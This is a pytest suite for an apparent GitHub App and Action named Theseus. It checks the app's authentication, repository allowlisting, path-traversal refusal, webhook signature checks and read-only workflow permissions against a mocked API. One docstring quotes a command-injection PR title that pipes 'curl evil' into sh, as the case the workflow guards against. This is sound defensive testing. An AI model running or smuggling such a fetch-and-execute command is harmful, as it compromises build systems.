"""The Theseus Action, the App's GitHub calls and the webhook (docs/spec/07-github-and-deploy.md), against a
respx-mocked GitHub API: no test touches the network."""

from __future__ import annotations

import hashlib
import hmac
import json
import re
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import httpx
import jwt
import pytest
import respx
import yaml
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from fastapi.testclient import TestClient

from theseus.agent.render import MARKER
from theseus.api import routes
from theseus.api.app import create_app
from theseus.api.github import API, GitHub
from theseus.config import Settings
from theseus.errors import GitHubError

REPO = "demo-org/theseus"
APP_ID = 123
INSTALLATION = 42
HEAD = "a" * 40
BASE = "b" * 40
NOW = 1_790_000_000.0
SECRET = "webhook-secret-not-real"
TOKEN = "theseus-token-not-real"
WORKFLOW = Path(".github/workflows/theseus.yml")


@pytest.fixture(scope="module")
def key_file(tmp_path_factory: pytest.TempPathFactory) -> Path:
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    path = tmp_path_factory.mktemp("app") / "theseus.private-key.pem"
    path.write_bytes(
        key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption(),
        )
    )
    return path


@pytest.fixture
def settings(key_file: Path) -> Settings:
    return Settings(
        _env_file=None,
        github_app_id=str(APP_ID),
        github_app_private_key_path=key_file,
        github_webhook_secret=SECRET,
        theseus_token=TOKEN,
        theseus_repos=REPO,
    )


class FakeGitHub:
    """The slice of GitHub's REST API the App uses, as respx routes over a little state."""

    def __init__(self) -> None:
        self.router = respx.Router(base_url=API, assert_all_called=False)
        self.comments: list[dict[str, Any]] = []
        self.checks: list[dict[str, Any]] = []
        self.reruns: list[int] = []
        self.files = ["demo-infra/terraform/people.tf"]
        # PR 8 is open only when a test adds it; it may share PR 7's head and target another base.
        self.files_8: list[str] = []
        self.open_prs: list[dict[str, Any]] = [{"number": 7, "head": {"sha": HEAD}}]
        self.permission = "write"
        self.runs: list[dict[str, Any]] = [{"id": 99, "status": "completed", "head_sha": HEAD}]
        self.head = HEAD
        self.token_calls = 0
        r = self.router
        r.get(f"/repos/{REPO}/installation").mock(side_effect=self._installation)
        r.post(f"/app/installations/{INSTALLATION}/access_tokens").mock(side_effect=self._token)
        r.get(f"/repos/{REPO}/pulls/7").mock(side_effect=self._pull)
        r.get(f"/repos/{REPO}/pulls/7/files").mock(side_effect=self._files)
        r.get(f"/repos/{REPO}/pulls/8/files").mock(side_effect=self._files_8)
        r.get(f"/repos/{REPO}/pulls").mock(side_effect=self._open_pulls)
        r.get(f"/repos/{REPO}/issues/7/comments").mock(side_effect=self._list_comments)
        r.post(f"/repos/{REPO}/issues/7/comments").mock(side_effect=self._create_comment)
        r.patch(url__regex=rf"/repos/{REPO}/issues/comments/(?P<cid>\d+)$").mock(
            side_effect=self._edit_comment
        )
        r.get(url__regex=rf"/repos/{REPO}/commits/(?P<sha>\w+)/check-runs").mock(
            side_effect=self._list_checks
        )
        r.post(f"/repos/{REPO}/check-runs").mock(side_effect=self._create_check)
        r.patch(url__regex=rf"/repos/{REPO}/check-runs/(?P<cid>\d+)$").mock(side_effect=self._edit_check)
        r.get(f"/repos/{REPO}/actions/workflows/theseus.yml/runs").mock(side_effect=self._runs)
        r.post(url__regex=rf"/repos/{REPO}/actions/runs/(?P<rid>\d+)/rerun$").mock(side_effect=self._rerun)
        r.get(url__regex=rf"/repos/{REPO}/collaborators/(?P<user>[\w-]+)/permission$").mock(
            side_effect=self._permission
        )
        r.get(url__regex=rf"/repos/{REPO}/contents/(?P<path>[^?]+)").mock(side_effect=self._contents)

    # Auth -------------------------------------------------------------------------------------------------

    def _installation(self, request: httpx.Request) -> httpx.Response:
        claims = jwt.decode(
            request.headers["Authorization"].removeprefix("Bearer "), options={"verify_signature": False}
        )
        assert claims["iss"] == str(APP_ID) and claims["exp"] - claims["iat"] <= 600
        return httpx.Response(200, json={"id": INSTALLATION})

    def _token(self, request: httpx.Request) -> httpx.Response:
        self.token_calls += 1
        return httpx.Response(201, json={"token": "ghs_installation", "expires_at": "2026-09-21T15:00:00Z"})

    @staticmethod
    def _authed(request: httpx.Request) -> None:
        assert request.headers["Authorization"] == "Bearer ghs_installation"

    # Pull requests ----------------------------------------------------------------------------------------

    def _pull(self, request: httpx.Request) -> httpx.Response:
        self._authed(request)
        return httpx.Response(200, json={"number": 7, "title": "t", "body": "b", "head": {"sha": self.head}})

    def _files(self, request: httpx.Request) -> httpx.Response:
        page = int(request.url.params.get("page", "1"))
        rows = [{"filename": f} for f in self.files] if page == 1 else []
        return httpx.Response(200, json=rows)

    def _files_8(self, request: httpx.Request) -> httpx.Response:
        page = int(request.url.params.get("page", "1"))
        return httpx.Response(200, json=[{"filename": f} for f in self.files_8] if page == 1 else [])

    def _open_pulls(self, request: httpx.Request) -> httpx.Response:
        assert request.url.params["state"] == "open"
        page = int(request.url.params.get("page", "1"))
        return httpx.Response(200, json=self.open_prs if page == 1 else [])

    def _list_comments(self, request: httpx.Request) -> httpx.Response:
        page = int(request.url.params.get("page", "1"))
        return httpx.Response(200, json=self.comments if page == 1 else [])

    def _create_comment(self, request: httpx.Request) -> httpx.Response:
        self._authed(request)
        comment = {
            "id": 1000 + len(self.comments),
            "body": json.loads(request.content)["body"],
            "performed_via_github_app": {"id": APP_ID},
        }
        self.comments.append(comment)
        return httpx.Response(201, json=comment)

    def _edit_comment(self, request: httpx.Request, cid: str) -> httpx.Response:
        comment = next(c for c in self.comments if c["id"] == int(cid))
        comment["body"] = json.loads(request.content)["body"]
        return httpx.Response(200, json=comment)

    # Checks -----------------------------------------------------------------------------------------------

    def _list_checks(self, request: httpx.Request, sha: str) -> httpx.Response:
        assert request.url.params["check_name"] == "Theseus"
        assert request.url.params["app_id"] == str(APP_ID)
        runs = [c for c in self.checks if c["head_sha"] == sha]
        return httpx.Response(200, json={"total_count": len(runs), "check_runs": runs})

    def _create_check(self, request: httpx.Request) -> httpx.Response:
        check = {"id": 500 + len(self.checks), **json.loads(request.content)}
        self.checks.append(check)
        return httpx.Response(201, json=check)

    def _edit_check(self, request: httpx.Request, cid: str) -> httpx.Response:
        check = next(c for c in self.checks if c["id"] == int(cid))
        check.update(json.loads(request.content))
        return httpx.Response(200, json=check)

    # Workflow runs and permissions ------------------------------------------------------------------------

    def _runs(self, request: httpx.Request) -> httpx.Response:
        sha = request.url.params["head_sha"]
        runs = [r for r in self.runs if r["head_sha"] == sha]
        return httpx.Response(200, json={"total_count": len(runs), "workflow_runs": runs})

    def _rerun(self, request: httpx.Request, rid: str) -> httpx.Response:
        self.reruns.append(int(rid))
        return httpx.Response(201)

    def _permission(self, request: httpx.Request, user: str) -> httpx.Response:
        return httpx.Response(200, json={"permission": self.permission, "user": {"login": user}})

    def _contents(self, request: httpx.Request, path: str) -> httpx.Response:
        assert request.url.params["ref"] == HEAD
        assert request.headers["Accept"] == "application/vnd.github.raw+json"
        return httpx.Response(200, text=f"# {path}\n")

    @property
    def calls(self) -> int:
        return len(self.router.calls)


@pytest.fixture
def fake() -> FakeGitHub:
    return FakeGitHub()


@pytest.fixture
def gh(settings: Settings, fake: FakeGitHub) -> GitHub:
    client = httpx.Client(base_url=API, transport=httpx.MockTransport(fake.router.handler))
    return GitHub(settings, client=client, clock=lambda: NOW)


@pytest.fixture
def client(settings: Settings, gh: GitHub) -> Iterator[TestClient]:
    app = create_app(connect=lambda: object())
    app.dependency_overrides[routes.get_settings] = lambda: settings
    app.dependency_overrides[routes.get_github] = lambda: gh
    with TestClient(app) as c:
        yield c


def analyze_body(**extra: Any) -> dict[str, Any]:
    return {
        "repo": REPO,
        "pr_number": 7,
        "base_sha": BASE,
        "head_sha": HEAD,
        "pr_title": "Add Priya to support-engineers",
        "pr_body": "She reads logs.",
        "base_plan": {},
        "head_plan": {},
        "checkov": {"passed": 228, "failed": 81, "skipped": 0, "checkov_version": "3.3.29"},
        **extra,
    }


def analyze(client: TestClient, token: str | None = TOKEN, **extra: Any) -> httpx.Response:
    headers = {"X-Theseus-Token": token} if token is not None else {}
    return client.post("/analyze", json=analyze_body(**extra), headers=headers)


def webhook(client: TestClient, event: str, payload: dict[str, Any], secret: str = SECRET) -> httpx.Response:
    body = json.dumps(payload).encode()
    signature = "sha256=" + hmac.new(secret.encode(), body, hashlib.sha256).hexdigest()
    headers = {"X-GitHub-Event": event, "X-Hub-Signature-256": signature, "Content-Type": "application/json"}
    return client.post("/webhooks/github", content=body, headers=headers)


# The App's calls --------------------------------------------------------------------------------------------


def test_the_app_jwt_is_short_lived_and_signed_with_the_app_key(gh: GitHub, key_file: Path) -> None:
    from cryptography.hazmat.primitives.serialization import load_pem_private_key

    public = load_pem_private_key(key_file.read_bytes(), password=None).public_key()
    claims = jwt.decode(gh.app_jwt(), public, algorithms=["RS256"], options={"verify_exp": False})
    assert claims == {"iss": str(APP_ID), "iat": int(NOW) - 60, "exp": int(NOW) + 540}


def test_the_installation_token_is_cached_until_near_expiry(gh: GitHub, fake: FakeGitHub) -> None:
    assert gh.installation_token(REPO) == "ghs_installation"
    assert gh.installation_token(REPO) == "ghs_installation"
    assert fake.token_calls == 1


def test_a_repo_outside_theseus_repos_is_refused_before_any_request(gh: GitHub, fake: FakeGitHub) -> None:
    with pytest.raises(GitHubError, match="THESEUS_REPOS"):
        gh.upsert_comment("someone/else", 7, "hi")
    assert fake.calls == 0


def test_files_are_read_at_a_sha_and_only_under_the_world_root(gh: GitHub) -> None:
    assert gh.read_file(REPO, "demo-infra/terraform/people.tf", HEAD) == "# demo-infra/terraform/people.tf\n"
    for path in ("theseus/config.py", "demo-infra/../.env", "demo-infra-old/x.tf"):
        with pytest.raises(GitHubError, match="world root"):
            gh.read_file(REPO, path, HEAD)


def test_a_github_error_names_the_method_path_and_status(gh: GitHub, fake: FakeGitHub) -> None:
    fake.router.get(f"/repos/{REPO}/pulls/8").respond(404, json={"message": "Not Found"})
    with pytest.raises(GitHubError, match=r"GET /repos/demo-org/theseus/pulls/8: 404 Not Found"):
        gh.pull_request(REPO, 8)


def test_only_the_app_s_own_comment_is_edited(gh: GitHub, fake: FakeGitHub) -> None:
    """Someone pasting the marker into their own comment does not make Theseus edit it."""
    fake.comments.append({"id": 1, "body": f"{MARKER}\nfake", "performed_via_github_app": None})
    cid = gh.upsert_comment(REPO, 7, f"{MARKER}\nreal")
    assert cid != 1 and fake.comments[0]["body"] == f"{MARKER}\nfake"


# /analyze from the Action -----------------------------------------------------------------------------------


def test_the_comment_is_created_once_and_then_edited(client: TestClient, fake: FakeGitHub) -> None:
    assert analyze(client).status_code == 200
    assert analyze(client).status_code == 200
    [comment] = fake.comments
    assert comment["body"].startswith(MARKER)
    assert "Merge blocked" in comment["body"]


def test_the_check_run_carries_the_verdict_and_an_opened_path_fails_it(
    client: TestClient, fake: FakeGitHub
) -> None:
    res = analyze(client)
    assert res.status_code == 200 and res.json()["opened"]
    analyze(client)
    [check] = fake.checks
    assert (check["name"], check["head_sha"], check["status"], check["conclusion"]) == (
        "Theseus",
        HEAD,
        "completed",
        "failure",
    )
    assert check["output"]["title"].startswith("Merge blocked: ")
    summary = check["output"]["summary"]
    assert "Merge blocked" in summary and "<details>" not in summary and MARKER not in summary


def test_a_stale_run_updates_its_own_check_but_not_the_comment(client: TestClient, fake: FakeGitHub) -> None:
    """A re-run of an old commit must not overwrite the comment a newer push wrote."""
    fake.head = "c" * 40
    assert analyze(client).status_code == 200
    assert fake.comments == [] and [c["head_sha"] for c in fake.checks] == [HEAD]


@pytest.mark.parametrize("token", [None, "wrong", ""])
def test_a_missing_or_wrong_token_is_refused(client: TestClient, fake: FakeGitHub, token: str | None) -> None:
    assert analyze(client, token=token).status_code == 401
    assert fake.calls == 0


def test_analyze_for_a_repo_outside_theseus_repos_is_refused(client: TestClient, fake: FakeGitHub) -> None:
    assert analyze(client, repo="someone/else").status_code == 403
    assert fake.calls == 0


def test_a_fixture_request_needs_no_token_and_calls_no_github(client: TestClient, fake: FakeGitHub) -> None:
    res = client.post("/analyze", json={"fixture": "sample"})
    assert res.status_code == 200 and fake.calls == 0


# The webhook ------------------------------------------------------------------------------------------------


def review_comment(body: str = "/theseus review", user: str = "sam") -> dict[str, Any]:
    return {
        "action": "created",
        "repository": {"full_name": REPO},
        "issue": {"number": 7, "pull_request": {"url": "x"}},
        "comment": {"body": body, "user": {"login": user}},
    }


def test_theseus_review_reruns_the_latest_workflow_run_for_the_head(
    client: TestClient, fake: FakeGitHub
) -> None:
    assert webhook(client, "issue_comment", review_comment()).status_code == 204
    assert fake.reruns == [99]


def test_theseus_review_from_someone_without_write_access_does_nothing(
    client: TestClient, fake: FakeGitHub
) -> None:
    fake.permission = "read"
    assert webhook(client, "issue_comment", review_comment()).status_code == 204
    assert fake.reruns == []


def test_other_comments_are_ignored(client: TestClient, fake: FakeGitHub) -> None:
    for body in ("/theseus reviewed", "please /theseus review", "LGTM"):
        assert webhook(client, "issue_comment", review_comment(body)).status_code == 204
    assert fake.calls == 0


def test_a_running_review_is_not_started_twice(client: TestClient, fake: FakeGitHub) -> None:
    fake.runs[0]["status"] = "in_progress"
    assert webhook(client, "issue_comment", review_comment()).status_code == 204
    assert fake.reruns == []


def rerequested(name: str = "Theseus", app_id: int = APP_ID) -> dict[str, Any]:
    return {
        "action": "rerequested",
        "repository": {"full_name": REPO},
        "check_run": {
            "name": name,
            "head_sha": HEAD,
            "app": {"id": app_id},
            "pull_requests": [{"number": 7}],
        },
    }


def test_rerunning_the_check_reruns_the_review(client: TestClient, fake: FakeGitHub) -> None:
    assert webhook(client, "check_run", rerequested()).status_code == 204
    assert fake.reruns == [99]


def test_rerunning_someone_else_s_check_does_nothing(client: TestClient, fake: FakeGitHub) -> None:
    assert webhook(client, "check_run", rerequested(app_id=7)).status_code == 204
    assert webhook(client, "check_run", rerequested(name="CI")).status_code == 204
    assert fake.reruns == []


def pull_request(action: str = "opened") -> dict[str, Any]:
    return {
        "action": action,
        "repository": {"full_name": REPO},
        "number": 7,
        "pull_request": {"number": 7, "head": {"sha": HEAD}},
    }


def test_a_pr_outside_the_world_root_gets_a_success_check(client: TestClient, fake: FakeGitHub) -> None:
    fake.files = ["README.md", "theseus/api/routes.py"]
    assert webhook(client, "pull_request", pull_request()).status_code == 204
    [check] = fake.checks
    assert (check["conclusion"], check["output"]["title"]) == ("success", "Nothing under demo-infra changed")


def test_a_pr_sharing_its_head_never_passes_a_failing_review(client: TestClient, fake: FakeGitHub) -> None:
    """PR 8 opens PR 7's head against a base where nothing under the world root differs. The check belongs
    to the commit, so PR 8 must not replace PR 7's failing review with a pass."""
    fake.files = ["demo-infra/terraform/people.tf"]
    fake.files_8 = ["README.md"]
    fake.open_prs.append({"number": 8, "head": {"sha": HEAD}})
    fake.checks.append(
        {"id": 500, "name": "Theseus", "head_sha": HEAD, "status": "completed", "conclusion": "failure"}
    )
    event = {**pull_request(), "number": 8, "pull_request": {"number": 8, "head": {"sha": HEAD}}}
    assert webhook(client, "pull_request", event).status_code == 204
    assert [(c["id"], c["conclusion"]) for c in fake.checks] == [(500, "failure")]


def test_a_pr_alone_on_its_head_still_gets_its_pass(client: TestClient, fake: FakeGitHub) -> None:
    fake.files = ["README.md"]
    fake.files_8 = ["docs/x.md"]
    fake.open_prs.append({"number": 8, "head": {"sha": "c" * 40}})
    assert webhook(client, "pull_request", pull_request()).status_code == 204
    [check] = fake.checks
    assert check["conclusion"] == "success"


def test_a_pr_inside_the_world_root_is_left_to_the_action(client: TestClient, fake: FakeGitHub) -> None:
    fake.files = ["README.md", "demo-infra/terraform/people.tf"]
    assert webhook(client, "pull_request", pull_request("synchronize")).status_code == 204
    assert fake.checks == []


def test_rerunning_the_check_of_a_pr_outside_the_world_root_posts_it_again(
    client: TestClient, fake: FakeGitHub
) -> None:
    fake.files, fake.runs = ["README.md"], []
    assert webhook(client, "check_run", rerequested()).status_code == 204
    assert [c["conclusion"] for c in fake.checks] == ["success"]


def test_a_bad_signature_is_refused_and_nothing_is_called(client: TestClient, fake: FakeGitHub) -> None:
    assert webhook(client, "issue_comment", review_comment(), secret="wrong").status_code == 401
    res = client.post("/webhooks/github", content=b"{}", headers={"X-GitHub-Event": "ping"})
    assert res.status_code == 401
    assert fake.calls == 0


def test_a_webhook_from_a_repo_outside_theseus_repos_is_refused(client: TestClient, fake: FakeGitHub) -> None:
    payload = {**review_comment(), "repository": {"full_name": "someone/else"}}
    assert webhook(client, "issue_comment", payload).status_code == 403
    assert fake.calls == 0


def test_other_events_are_accepted_and_ignored(client: TestClient, fake: FakeGitHub) -> None:
    assert webhook(client, "ping", {"zen": "Keep it logically awesome."}).status_code == 204
    assert (
        webhook(client, "push", {"repository": {"full_name": REPO}, "ref": "refs/heads/main"}).status_code
        == 204
    )
    assert webhook(client, "pull_request", pull_request("closed")).status_code == 204
    assert fake.calls == 0


# The Action -------------------------------------------------------------------------------------------------


@pytest.fixture(scope="module")
def workflow() -> dict[Any, Any]:
    return yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))


def test_the_action_runs_only_for_pull_requests_touching_the_world_root(workflow: dict[Any, Any]) -> None:
    on = workflow[True]  # YAML 1.1 reads the key `on` as True
    assert list(on) == ["pull_request"]
    assert on["pull_request"]["types"] == ["opened", "synchronize", "reopened", "edited"]
    assert on["pull_request"]["paths"] == ["demo-infra/**"]


def test_the_action_runs_once_per_pr_with_read_only_permissions(workflow: dict[Any, Any]) -> None:
    assert workflow["concurrency"] == {
        "group": "theseus-${{ github.event.pull_request.number }}",
        "cancel-in-progress": True,
    }
    assert workflow["permissions"] == {"contents": "read", "pull-requests": "read"}


def test_no_run_step_interpolates_an_expression(workflow: dict[Any, Any]) -> None:
    """A PR title like `"; curl evil | sh; "` must reach the shell as data, through env:, never as code."""
    steps = [s for job in workflow["jobs"].values() for s in job["steps"]]
    runs = [s["run"] for s in steps if "run" in s]
    assert runs and all("${{" not in run for run in runs)
    env = {k: v for s in steps for k, v in s.get("env", {}).items()}
    assert env["PR_TITLE"] == "${{ github.event.pull_request.title }}"
    assert env["PR_BODY"] == "${{ github.event.pull_request.body }}"
    assert env["THESEUS_TOKEN"] == "${{ secrets.THESEUS_TOKEN }}"


def test_the_action_plans_both_sides_runs_checkov_and_posts_to_analyze(workflow: dict[Any, Any]) -> None:
    text = WORKFLOW.read_text(encoding="utf-8")
    steps = [s for job in workflow["jobs"].values() for s in job["steps"]]
    uses = [s["uses"] for s in steps if "uses" in s]
    assert all(re.fullmatch(r"[\w.-]+/[\w.-]+@v\d+(\.\d+)*", u) for u in uses), uses
    setup = next(s for s in steps if s.get("uses", "").startswith("hashicorp/setup-terraform"))
    assert setup["with"]["terraform_version"] == "1.16.6"
    checkout = [s for s in steps if s.get("uses", "").startswith("actions/checkout")]
    assert [c["with"].get("path") for c in checkout] == [None, "base"]
    for needle in ("terraform show -json", "checkov==3.3.29", "/analyze", "X-Theseus-Token", "jq -n"):
        assert needle in text, needle


def test_the_app_manifest_asks_for_what_spec_07_lists() -> None:
    manifest = json.loads(Path("deploy/github-app-manifest.json").read_text(encoding="utf-8"))
    assert manifest["default_permissions"] == {
        "actions": "write",
        "checks": "write",
        "contents": "write",
        "issues": "write",
        "metadata": "read",
        "pull_requests": "write",
    }
    assert sorted(manifest["default_events"]) == ["check_run", "issue_comment", "pull_request", "push"]
    assert manifest["hook_attributes"]["url"] == "https://<DOMAIN>/webhooks/github"
    assert manifest["public"] is False
